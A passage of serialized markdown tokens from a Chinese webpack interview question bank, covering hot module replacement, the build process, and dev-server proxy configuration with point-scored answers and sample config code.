HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识\\n- **1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n![alt text](/public/images/image.png)","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，\\n","task":false,"loose":false,"text":"**1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","tokens":[{"type":"text","raw":"**1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","text":"**1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","text":" 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。\\n","task":false,"loose":false,"text":"**1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","tokens":[{"type":"text","raw":"**1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","text":"**1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","text":" 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识\\n","task":false,"loose":false,"text":"**1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","tokens":[{"type":"text","raw":"**1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","text":"**1：** 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","text":" 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n![alt text](/public/images/image.png)","task":false,"loose":false,"text":"**1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n![alt text](/public/images/image.png)","tokens":[{"type":"text","raw":"**1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n\\n![alt text](/public/images/image.png)","text":"**1：** 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n![alt text](/public/images/image.png)","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n","text":" 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n","escaped":false},{"type":"image","raw":"![alt text](/public/images/image.png)","href":"/public/images/image.png","title":null,"text":"alt text"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 简述webpack的构建流程？\\n\\n","depth":2,"text":"简述webpack的构建流程？","tokens":[{"type":"text","raw":"简述webpack的构建流程？","text":"简述webpack的构建流程？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数\\n- **1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理\\n- **1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n![alt text](/public/images/image2.png)","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数\\n","task":false,"loose":false,"text":"**1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","tokens":[{"type":"text","raw":"**1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","text":"**1：** 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","text":" 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理\\n","task":false,"loose":false,"text":"**1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","tokens":[{"type":"text","raw":"**1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","text":"**1：** 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","text":" 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n![alt text](/public/images/image2.png)","task":false,"loose":false,"text":"**1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n![alt text](/public/images/image2.png)","tokens":[{"type":"text","raw":"**1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n\\n![alt text](/public/images/image2.png)","text":"**1：** 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n![alt text](/public/images/image2.png)","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n","text":" 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n","escaped":false},{"type":"image","raw":"![alt text](/public/images/image2.png)","href":"/public/images/image2.png","title":null,"text":"alt text"}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack proxy是什么？\\n\\n","depth":2,"text":"webpack proxy是什么？","tokens":[{"type":"text","raw":"webpack proxy是什么？","text":"webpack proxy是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","task":false,"loose":false,"text":"**2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","tokens":[{"type":"text","raw":"**2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","text":"**2：** webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","text":" webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack 中提供服务器的工具是什么？\\n\\n","depth":2,"text":"webpack 中提供服务器的工具是什么？","tokens":[{"type":"text","raw":"webpack 中提供服务器的工具是什么？","text":"webpack 中提供服务器的工具是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** webpack 中提供服务器的工具为 webpack-dev-server","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** webpack 中提供服务器的工具为 webpack-dev-server","task":false,"loose":false,"text":"**1：** webpack 中提供服务器的工具为 webpack-dev-server","tokens":[{"type":"text","raw":"**1：** webpack 中提供服务器的工具为 webpack-dev-server","text":"**1：** webpack 中提供服务器的工具为 webpack-dev-server","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" webpack 中提供服务器的工具为 webpack-dev-server","text":" webpack 中提供服务器的工具为 webpack-dev-server","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack-dev-server是什么？\\n\\n","depth":2,"text":"webpack-dev-server是什么？","tokens":[{"type":"text","raw":"webpack-dev-server是什么？","text":"webpack-dev-server是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","task":false,"loose":false,"text":"**1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","tokens":[{"type":"text","raw":"**1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","text":"**1：** webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","text":" webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack代理怎么配置？proxy中常用的属性是什么？\\n\\n","depth":2,"text":"webpack代理怎么配置？proxy中常用的属性是什么？","tokens":[{"type":"text","raw":"webpack代理怎么配置？proxy中常用的属性是什么？","text":"webpack代理怎么配置？proxy中常用的属性是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- **1：** 配置如下：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 配置如下：","task":false,"loose":false,"text":"**1：** 配置如下：","tokens":[{"type":"text","raw":"**1：** 配置如下：","text":"**1：** 配置如下：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 配置如下：","text":" 配置如下：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nconst path = require(\\"path\\");\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    contentBase: path.join(__dirname, \\"dist\\"),\\n    compress: true,\\n    port: 9000,\\n    proxy: {\\n      \\"/api\\": {\\n        target: \\"https://api.github.com\\",// \\n      },\\n    },\\n    // ...\\n  },\\n};\\n```","lang":"javascript","text":"const path = require(\\"path\\");\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    contentBase: path.join(__dirname, \\"dist\\"),\\n    compress: true,\\n    port: 9000,\\n    proxy: {\\n      \\"/api\\": {\\n        target: \\"https://api.github.com\\",// \\n      },\\n    },\\n    // ...\\n  },\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **2：** 常用属性：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 常用属性：","task":false,"loose":false,"text":"**2：** 常用属性：","tokens":[{"type":"text","raw":"**2：** 常用属性：","text":"**2：** 常用属性：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 常用属性：","text":" 常用属性：","escaped":false}]}]}]},{"type":"space","raw":"  \\n\\n"},{"type":"blockquote","raw":" >target：表示的是代理到的目标地址  \\n >pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite  \\n >secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false  \\n >changeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","tokens":[{"type":"paragraph","raw":"target：表示的是代理到的目标地址  \\npathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite  \\nsecure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false  \\nchangeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","text":"target：表示的是代理到的目标地址  \\npathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite  \\nsecure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false  \\nchangeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","tokens":[{"type":"text","raw":"target：表示的是代理到的目标地址","text":"target：表示的是代理到的目标地址","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite","text":"pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false","text":"secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"changeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","text":"changeOrigin：它表示是否更新代理后请求的 headers 中host地址  ","escaped":false}]}],"text":"target：表示的是代理到的目标地址  \\npathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite  \\nsecure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false  \\nchangeOrigin：它表示是否更新代理后请求的 headers 中host地址  "},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## proxy是工作原理？\\n\\n","depth":2,"text":"proxy是工作原理？","tokens":[{"type":"text","raw":"proxy是工作原理？","text":"proxy是工作原理？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","task":false,"loose":false,"text":"**1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","tokens":[{"type":"text","raw":"**1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","text":"**1：** proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","text":" proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nconst express = require(\'express\');\\nconst proxy = require(\'http-proxy-middleware\');\\nconst app = express();\\napp.use(\'/api\', proxy({target: \'http://www.example.org\', changeOrigin: true\\n}));\\napp.listen(3000);\\n```","lang":"javascript","text":"const express = require(\'express\');\\nconst proxy = require(\'http-proxy-middleware\');\\nconst app = express();\\napp.use(\'/api\', proxy({target: \'http://www.example.org\', changeOrigin: true\\n}));\\napp.listen(3000);"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack proxy 为什么能解决跨域？\\n\\n","depth":2,"text":"webpack proxy 为什么能解决跨域？","tokens":[{"type":"text","raw":"webpack proxy 为什么能解决跨域？","text":"webpack proxy 为什么能解决跨域？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。  \\n在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。  